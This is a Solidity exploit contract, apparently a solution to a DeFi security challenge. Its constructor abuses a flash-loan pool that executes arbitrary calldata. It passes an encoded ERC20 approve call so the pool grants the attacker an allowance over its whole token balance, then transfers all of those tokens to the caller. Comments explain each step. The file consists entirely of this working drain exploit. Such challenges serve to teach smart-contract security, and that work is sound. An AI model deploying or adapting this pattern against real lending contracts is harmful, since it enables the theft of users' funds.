// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFreeLenderPool {
    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract AttackFree {

    constructor(address lenderAddress, address tokenAddress, uint tokensInPool) {
        IFreeLenderPool lender = IFreeLenderPool(lenderAddress);
        /* 
        We call the flashLoan functions with the following arguments:
            - borrowAmount: 0 -> We are not borrowing anything
            - receiver: address(this) -> Our attacker contract (matters?)
            - target: tokenAddress -> Token contract
            - data: The signature of the ERC20 approve function, in order to give this contract (out attacker contract) the allowance for the tokens
        */
        lender.flashLoan(0, address(this), tokenAddress, abi.encodeWithSignature("approve(address,uint256)", address(this), tokensInPool));

        IERC20 token = IERC20(tokenAddress);
        // We transfer the tokens to the attacker (whoever calls this contract)
        token.transferFrom(lenderAddress, msg.sender, tokensInPool);
    }

}